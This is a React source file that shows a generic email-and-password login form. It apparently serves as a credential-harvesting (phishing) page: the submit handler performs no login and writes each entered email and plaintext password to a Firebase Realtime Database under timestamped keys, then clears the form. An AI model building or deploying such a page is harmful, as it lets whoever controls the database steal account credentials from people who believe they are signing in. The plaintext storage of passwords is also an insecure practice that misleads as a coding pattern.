import { useState, useEffect, useRef } from "react";

// image
import laptop from "./laptop.jpg";

// firebase
import { db } from "./firebase";
import { set, ref } from "firebase/database";

function App() {
  const [pass, setPass] = useState("");
  const [email, setEmail] = useState("");
  const [num, setNum] = useState(1);

  const submitRef = useRef();

  const handleEmail = (e) => {
    setEmail(e.target.value);
  };

  const handlePassword = (e) => {
    setPass(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    const date = new Date().getTime();
    console.log(date);
    set(ref(db, `info${num}`), {
      email: email,
      pass: pass,
    });

    setEmail("");
    setPass("");
    setNum(date);
  };

  return (
    <div className="app" style={{ backgroundImage: laptop }}>
      <img src={laptop} alt="laptop" className="laptop" />

      <form className="form" onSubmit={(e) => handleSubmit(e)}>
        <div>
          <label htmlFor="email">Email</label>
          <input
            type="email"
            value={email}
            onChange={handleEmail}
            required
            ref={submitRef}
          />
        </div>
        <div>
          <label htmlFor="password">Password</label>
          <input
            type="password"
            value={pass}
            onChange={handlePassword}
            required
          />
        </div>
        <div className="btnCont">
          <button type="submit">Login</button>
        </div>
      </form>
    </div>
  );
}

export default App;
